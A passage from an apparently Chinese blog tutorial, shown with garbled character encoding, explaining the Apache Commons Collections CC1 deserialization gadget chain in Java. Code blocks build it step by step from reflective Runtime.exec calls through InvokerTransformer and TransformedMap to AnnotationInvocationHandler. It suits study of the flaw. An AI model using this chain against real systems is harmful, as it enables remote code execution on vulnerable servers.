å…¥çš„ã€‚å¾ˆå¤§å¯èƒ½æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶çš„ã€‚</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¿›è¡Œåå°„è°ƒç”¨Runtimeä¸­çš„execä»è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯åˆ©ç”¨åå°„æ¥è¿›è¡Œè°ƒç”¨çš„ã€‚é‚£æˆ‘ä»¬å…ˆç®€å•çš„å†™ä¸€ä¸ªæ­£å¸¸çš„åˆ©ç”¨åå°„æ¥è°ƒç”¨Runtimeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å–Runtimeçš„class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-comment">//è·å–getRuntimeæ–¹æ³•</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-comment">//è·å–Runtimeå¯¹è±¡</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//è·å–execæ–¹æ³•</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-comment">//è°ƒç”¨execæ–¹æ³•</span><br>exec.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br><br><span class="hljs-comment">/*  Javaåå°„å¦‚æœä¸æ¸…æ¥šçš„åŒå­¦å¯ä»¥å…ˆå»å­¦ä¹ ä¸€ä¸‹Javaåå°„ç„¶åå†æ¥å­¦ä¹ ï¼Œè¦ä¸ç„¶ä»å¤´æ‡µåˆ°å°¾ï¼Œçœ‹äº†ç­‰äºæ²¡çœ‹ã€‚  </span><br><span class="hljs-comment">    è¿˜æœ‰å› ä¸ºæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯å°†æ•°æ®ååºåˆ—åŒ–ï¼Œè¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œæ—¶æˆ‘ä»¬è¦ååºåˆ—åŒ–è§¦å‘çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå¯ä»¥ååºåˆ—åŒ–çš„ç±»ï¼Œè€ŒRuntimeå¯¹è±¡æœ¬èº«æ—¶ä¸æ”¯æŒååºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†Runtimeçš„class</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨åå°„è°ƒç”¨äº†Runtimeä¸­çš„execï¼Œè¿™æ­£å’Œæˆ‘ä»¬çš„é“¾æ¡è§¦å‘ç‚¹å»åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥ç”¨æ¼æ´è§¦å‘ç‚¹çš„æ–¹å¼å†åå°„ä¸€è¾¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;æ–¹æ³•å&quot;</span>ï¼Œ<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;æ–¹æ³•å‚æ•°ç±»å‹&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;æ–¹æ³•å‚æ•°&#125;).transform(Object);<br><span class="hljs-comment">//å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–InvokerTransformerï¼Œå°†å‚æ•°ä¼ å…¥ï¼Œå†è°ƒç”¨ä»–çš„transformæ–¹æ³•å¹¶ç»™transformä¼ å…¥å¯¹åº”çš„å¯¹è±¡ã€‚</span><br><span class="hljs-comment">//ä¸‹é¢æˆ‘å°†ä¸Šé¢å†™çš„åå°„æ³¨é‡Šæ‰ï¼Œå¹¶æŠŠä»–ä»¬å¯¹åº”çš„è§¦å‘ç‚¹åˆ©ç”¨æ–¹å¼é™„ä¸Šã€‚</span><br><br><br><br><br><br> <span class="hljs-comment">//     Class c = Runtime.class;</span><br> <span class="hljs-comment">//     Method getRuntime = c.getMethod(&quot;getRuntime&quot;);</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br><br> <span class="hljs-comment">//     Object runtime = (Runtime) getRuntime.invoke(null);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntime);<br><br><br> <span class="hljs-comment">//     Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br> <span class="hljs-comment">//     exec.invoke(runtime,&quot;calc&quot;);</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><span class="hljs-comment">//é‡ç‚¹è®°ä½æœ€åä¸€ä¸ªï¼Œå› ä¸ºæœ€åä¸€ä¸ªæ˜¯ç›´æ¥è§¦å‘RCEçš„ä»£ç ï¼Œåç»­æˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾ˆç®€å•çš„å°±å°†å¯¹åº”çš„è§¦å‘ç‚¹åå°„å†™äº†å‡ºæ¥ï¼Œé‚£å…‰å†™å‡ºæ¥ä¸è¡Œå•Šï¼Œæ€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬æ¥ç€çœ‹è°è°ƒç”¨äº†<code>InvokerTransformer</code>ä¸­çš„<code>transform</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/a97f11a06a313cd1ef6f78a91c2f2f58.md.png" alt="image-20230830153422540"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬é€‰æ‹©<code>TransformedMap</code>ä¸­çš„<code>checkSetValue</code>è°ƒç”¨äº†<code>InvokerTransformer</code>ä¸­çš„<code>transform</code>ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹<code>checkSetValue</code>ä¸­çš„å‚æ•°åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œæ¥åˆ°<code>TransformedMap</code>çš„æ„é€ æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/6f6c5fd3d232559e0fa18e974df7bf41.png" alt="image-20230830153914097"></p><p>è¿™é‡Œå…¶å®æ˜¯å®ç°è£…é¥°HashMapçš„ï¼Œä½†æ˜¯ä»–çš„æ„é€ æ–¹æ³•æ˜¯protectedï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥è°ƒç”¨ï¼Œåªèƒ½æ˜¯é€šè¿‡ä»–å†…éƒ¨è°ƒç”¨ã€‚ä»–çš„åŠŸèƒ½å°±æ˜¯æ¥æ”¶ä¸€ä¸ªmapè¿›æ¥ï¼Œå¯¹ä»–çš„keyå’Œvalueè¿›è¡Œä¸€äº›æ“ä½œã€‚æˆ‘ä»¬çœ‹åˆ°<code>checkSetValue</code>ä¸­çš„<code>valueTransforme</code>å°±æ˜¯é€šè¿‡è¿™ä¸ªæ„é€ æ–¹æ³•ä¼ å…¥çš„ã€‚</p><p>é‚£ä¹ˆå¥½ï¼Œæˆ‘ä»¬å†çœ‹çœ‹è°è°ƒç”¨äº†è¿™ä¸ª<code>TransformedMap</code>,æœ€åå‘ç°å†<code>TransformedMap</code>ä¸­è¿˜æœ‰ä¸€ä¸ªé™æ€æ–¹æ³•<code>decorate</code>è°ƒç”¨äº†<code>TransformedMap</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/b3007e66e3b16a96bf9e0435870ac7ff.png" alt="image-20230830154730095"></p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ä»è¿™é‡Œå¼€å§‹ç»“åˆä¹‹å‰å†™çš„<code>InvokerTransformer</code>è°ƒç”¨execæ¥å…ˆå†™ä¸€ä¸‹åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">........æ­¤å¤„çœç•¥ä¸ºä¸Šé¢çš„åå°„ä»£ç ã€‚<br><span class="hljs-comment">//åˆ©ç”¨InvokerTransformerä¸­çš„transformè°ƒç”¨å‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªHashMap</span><br>HashMap&lt;Object, Object&gt; HM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//æ·»åŠ åˆ°Mapä¸­</span><br>HM.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//è°ƒç”¨è£…é¥°map       </span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, <span class="hljs-literal">null</span>, invokerTransformer);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è§£é‡Šï¼š</span><br><span class="hljs-comment">    é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªMapæ¥è¿›è¡Œè£…é¥°ï¼Œç»™Mapä¸­æ”¾ç½®ä»»æ„çš„å€¼ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯é€šè¿‡è°ƒç”¨decorteä»è€Œå»è°ƒç”¨TransformedMapçš„æ„é€ æ–¹æ³•å†è°ƒç”¨åˆ°ä»–çš„ChecksetValueæ–¹æ³•æœ€åè°ƒç”¨æˆ‘ä»¬çš„è§¦å‘ç‚¹InvokerTransformerä¸­çš„transformæ–¹æ³•ï¼Œå¯èƒ½æœ‰ç‚¹å¤šï¼Œä½†æ˜¯æ¢³ç†ä¸€ä¸‹è¿˜æ˜¯å¾ˆç®€å•çš„ã€‚</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">æ­£å‘ç†è§£ï¼š</span><br><span class="hljs-comment">    æˆ‘æŠŠå…·ä½“ä¼ å€¼çš„è°ƒç”¨æ‰§è¡Œæƒ…å†µæ­£å‘å†™ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬ä¸€ç›´æ˜¯åå‘åˆ†ææ­£å‘å†™å‡ºæ¥å¤§å®¶å¯èƒ½ä¼šæ¯”è¾ƒå¥½ç†è§£ï¼š</span><br><span class="hljs-comment">    é¦–å…ˆä¼ å…¥ï¼š</span><br><span class="hljs-comment">    Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, null, invokerTransformer);</span><br><span class="hljs-comment">    æ¥ä¸‹æ¥ä¼šæ¥åˆ°ï¼š</span><br><span class="hljs-comment">    public static decorate(HM,null,invokerTransformer)&#123;</span><br><span class="hljs-comment">        return new TransformedMap(HM,null,invokerTransformer);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    è°ƒç”¨æ„é€ æ–¹æ³•ï¼š</span><br><span class="hljs-comment">     protected TransformedMap(HM, null, invokerTransformer) &#123;</span><br><span class="hljs-comment">        super(HM);</span><br><span class="hljs-comment">        this.keyTransformer = null;</span><br><span class="hljs-comment">        this.valueTransformer = invokerTransformer;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    è°ƒç”¨ChecksetValueï¼š</span><br><span class="hljs-comment">        protected Object checkSetValue(runtime) &#123;</span><br><span class="hljs-comment">        return invokerTransformer.transform(runtime);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    è¿™æ ·çœ‹æ˜¯ä¸æ˜¯ç¬é—´å°±æ¸…æ™°å¾ˆå¤š</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢æˆ‘ä»¬åªæ˜¯åˆ†æäº†<code>checkSetValue</code>çš„èµ‹å€¼æƒ…å†µï¼Œä¸”è¿™ä¸Šè¿°çš„ä¸‰ä¸ªæ–¹æ³•æ˜¯åœ¨åŒä¸€ä¸ªç±»å½“ä¸­çš„ï¼Œå¹¶æ²¡æœ‰è€ƒè™‘åˆ°é“¾æ¡çš„é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹é“¾æ¡é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹è°è°ƒç”¨äº†è¿™ä¸ª<code>checkSetValue</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/524d33fc9737884f9648f449aa3253c5.png" alt="image-20230830164444288"></p><p><img src="https://ice.frostsky.com/2023/08/30/942f6d0196dc0090e6a465784bdab6cd.png" alt="image-20230830164509435"></p><p>å¯ä»¥çœ‹åˆ°åœ¨<code>AbstractInputCheckedMapDecorator</code>ä¸­çš„<code>MapEntry</code>ä¸­çš„<code>setValue</code>è°ƒç”¨äº†<code>checkSetValue</code>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å°±æ˜¯éå†Mapçš„ä¸€ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æƒ³è¦è§¦å‘<code>setValue</code>å°±å¿…é¡»éå†è¢«è£…é¥°è¿‡çš„Mapï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢å†™çš„<code>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, null, invokerTransformer);</code>ï¼Œæ—¢ç„¶æ¥åˆ°äº†é“¾æ¡çš„ä¸‹ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åå‘å†™ä¸€ä¸‹ä»–çš„åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªHashMap</span><br>HashMap&lt;Object, Object&gt; HM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//æ·»åŠ åˆ°Mapä¸­</span><br>HM.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//è°ƒç”¨è£…é¥°map       </span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, <span class="hljs-literal">null</span>, invokerTransformer);<br><br><span class="hljs-comment">//éå†è¢«ä¿®é¥°è¿‡çš„map</span><br><span class="hljs-keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<br>    entry.setValue(runtime);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">é‡ç‚¹ï¼ï¼ï¼ï¼ï¼   è¿™é‡Œå¯èƒ½å¾ˆå¤šäººå·²ç»ä¹±äº†ï¼Œæ²¡å…³ç³»ï¼Œæˆ‘æœ‰è§£é‡Šï¼Œä¸è¦æ€¥çœ‹ä¸æ‡‚å¤šçœ‹å‡ éã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è§£é‡Šï¼š</span><br><span class="hljs-comment">    å…ˆè§£é‡Šä¸€äº›è¿™ä¸ªå¢å¼ºä½›å¦‚å¾ªç¯ï¼Œåœ¨æ¯æ¬¡è¿­ä»£æ—¶å°†transformedmap.entrySet()èµ‹å€¼ç»™entryå˜é‡</span><br><span class="hljs-comment">    Map.Entryï¼šEntryæ˜¯Mapæ¥å£ä¸­çš„å†…éƒ¨æ¥å£ï¼Œè¡¨ç¤ºMapçš„ä¸€å¯¹é”®å’Œå€¼ã€‚</span><br><span class="hljs-comment">    entryï¼šè¿™æ˜¯å¾ªç¯å˜é‡ï¼Œç”¨äºéå†transformedmapä¸­çš„æ¡ç›®</span><br><span class="hljs-comment">    transformedmapï¼šæ˜¯æˆ‘ä»¬ä¼ å…¥çš„Mapå¯¹è±¡</span><br><span class="hljs-comment">    entry.setValue(runtime)ï¼šæ˜¯å°†å½“å‰çš„valueè®¾ç½®ä¸ºruntimeå¯¹è±¡ã€‚</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    æ€»ç»“ï¼šç›®çš„æ˜¯éå†transfirmedmapï¼Œå¹¶å°†valueè®¾ç½®ä¸ºruntimeå¯¹è±¡ã€‚</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">æ­£å‘ç†è§£è°ƒç”¨é“¾ï¼š</span><br><span class="hljs-comment">    é¦–å…ˆæˆ‘ä»¬è°ƒç”¨Entryå¹¶ä¼ å…¥transformedmapè¿›è¡Œéå†ï¼š</span><br><span class="hljs-comment">        public Object setValue(runtime) &#123;</span><br><span class="hljs-comment">            value = transformedmap.checkSetValue(runtime);</span><br><span class="hljs-comment">            return entry.setValue(value);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    ç”±äºé‡Œé¢è°ƒç”¨äº†transformedmap.checkSetValueï¼š</span><br><span class="hljs-comment">        protected Object checkSetValue(runtime) &#123;</span><br><span class="hljs-comment">            return invokerTransformer.transform(runtime);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    æœ€åä¼šæ¥åˆ°æ¼æ´åˆ©ç”¨ç‚¹ï¼š</span><br><span class="hljs-comment">    public Object transform(runtime) &#123;</span><br><span class="hljs-comment">        if (input == null) &#123;</span><br><span class="hljs-comment">            return null;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        try &#123;</span><br><span class="hljs-comment">            Class cls = runtime.getClass();</span><br><span class="hljs-comment">            Method method = cls.getMethod(â€œexecâ€, String.class);</span><br><span class="hljs-comment">            return method.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾è°éå†äº†<code>transformedmap</code>ä¸”åŒæ—¶è°ƒç”¨äº†<code>setValue</code>ï¼Œå› ä¸ºåªæœ‰åœ¨éå†<code>transformedmap</code>æ—¶è°ƒç”¨<code>setValue</code>æ‰èƒ½å°†<code>transformedmap</code>ä¼ å…¥ä»è€Œè§¦å‘æˆ‘ä»¬çš„åˆ©ç”¨é“¾ã€‚æˆ–è®¸ä½ ä¼šé—®äº†ï¼Œè¿™æ ·ä¸€ç›´æ‰¾å¾—æ‰¾åˆ°ä»€ä¹ˆæ—¶å€™ï¼Ÿè€Œä¸”æ‰¾åˆ°å“ªé‡Œæ‰ç®—ç»“æŸï¼Ÿ</p><p>goodquestionï¼ï¼ï¼æˆ‘ä»¬å¹¶ä¸æ˜¯æ— å˜å¤´çš„åœ¨æ‰¾è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬åªæ˜¯åœ¨æ‰¾è°ƒç”¨é“¾çš„è¿‡ç¨‹ä¸­å»å¯»æ‰¾è°ä½¿ç”¨äº†<code>readObject</code>æ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å…¥å£ç‚¹ï¼‰æ‰€ä»¥åªæœ‰æˆ‘ä»¬æœ€ç»ˆæ‰¾åˆ°è°ä¸ä»…åœ¨é“¾ä¸Šï¼Œè€Œä¸”è¿˜ä½¿ç”¨äº†readObjectæ‰ä¼šåˆ°è¾¾é“¾æ¡çš„ç»ˆç‚¹ã€‚</p><p>é‚£æˆ‘ä»¬æ¥ç€çœ‹è°éå†äº†<code>transformedmap</code>ä¸”è°ƒç”¨äº†<code>setValue</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/c48d522b64e5a023f559a2c8c610e76e.png" alt="image-20230830193844202"></p><p><img src="https://ice.frostsky.com/2023/08/30/6a5b84b146f4990adb002e2d8ce587c1.png" alt="image-20230830194005308">è¿™ä¸æ˜¯æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„ç»ˆç‚¹å—ï¼ï¼ï¼ï¼ï¼ˆåœ¨readObjecté‡Œéå†ä¸”è°ƒç”¨äº†setValue)</p><p>è¿™ä¸ªç±»åå¾ˆæ˜æ˜¾æ˜¯åŠ¨æ€ä»£ç†è¿‡ç¨‹ä¸­é‚£ä¸ªè°ƒç”¨å¤„ç†å™¨ç±»ï¼Œè€æ ·å­å…ˆçœ‹æ„é€ æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/b60e0e5afc2ba16e9734c1a125b54470.png" alt="image-20230830194938669"></p><p>ä»–æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ª<code>type</code>æ˜¯ä¸€ä¸ªç»§æ‰¿äº†Annotationçš„Classï¼Œè¿™ä¸ªAnnotationæ˜¯æ³¨è§£ï¼Œè¿™ä¸ªæ³¨è§£æˆ‘çš„ç†è§£å°±æ˜¯å¸¦@ç¬¦å·çš„ç±»ã€‚ç¬¬äºŒä¸ª<code>memberValues</code>æ˜¯ä¸€ä¸ªMapï¼Œè€Œä¸”è¿™ä¸ªMapæ˜¯æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶çš„ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠè®¾è®¡å¥½çš„<code>transformedmap</code>ä¼ è¿›å»ã€‚</p><p>ç°å®æ˜¯ç¾å¥½çš„ï¼Œåœ¨è¿™ä¹‹ä¸­è¿˜æœ‰å‡ ä¸ªå°é—®é¢˜ï¼š</p><ol><li>è¿™ä¸ª<code>AnnotationInvocationHandler</code>çš„æ„é€ æ–¹æ³•çš„æƒé™ä¿®é¥°ç¬¦æ˜¯æ²¡å†™çš„ï¼Œæ²¡å†™é»˜è®¤<code>default</code>æ‰€ä»¥è¿™é‡Œéœ€è¦åå°„è°ƒç”¨ã€‚</li><li>æˆ‘ä»¬çœ‹åˆ°åœ¨æ­£å¼è°ƒç”¨<code>setValue</code>ä¹‹å‰è¿˜æœ‰ä¸¤ä¸ªifåˆ¤æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œç»•è¿‡ã€‚</li><li>è¿˜æœ‰ä¸€ä¸ªå°é—®é¢˜å°±æ˜¯æˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥ä¼ å…¥Runtimeè¿™ä¸ªå¯¹è±¡ï¼Œå› ä¸ºä»–æ˜¯ä¸å…è®¸ååºåˆ—åŒ–çš„ï¼Œä½†æ˜¯Runtime.classæ˜¯å¯ä»¥çš„ï¼Œè¿™ä¸ªæˆ‘ä»¬åœ¨ä¹‹å‰ç¬¬ä¸€æ­¥åå°„è°ƒç”¨execçš„æ—¶å€™å·²ç»å¤„ç†è¿‡äº†ï¼Œä½†æ˜¯è¿˜éœ€è¦æ³¨æ„ã€‚</li><li>æˆ‘ä»¬æ³¨æ„åˆ°setValueçš„å‚æ•°å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è±¡ä¸­çš„é‚£ä¹ˆå®Œç¾</li></ol><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è§£å†³ä¸Šé¢è¿™äº›é—®é¢˜æ‰èƒ½çœŸæ­£çš„æ‰“é€šè¿™æ¡é“¾ï¼Œä¸‹é¢æ˜¯è§£å†³é—®é¢˜çš„æ€è·¯å’Œä»£ç ï¼š</p><p><strong>è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œåå°„è°ƒç”¨</span><br><br>    <span class="hljs-comment">//å› ä¸ºæ˜¯defaultï¼Œæ‰€ä»¥è¦é€šè¿‡å…¨ç±»åè·å–</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-comment">//è·å–æ„é€ æ–¹æ³•</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>    <span class="hljs-comment">//ç¡®ä¿è·å–</span><br>    annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">//ä¼ å…¥å‚æ•°</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯¦ç»†è§£é‡Šä¸€ä¸‹ä¼ 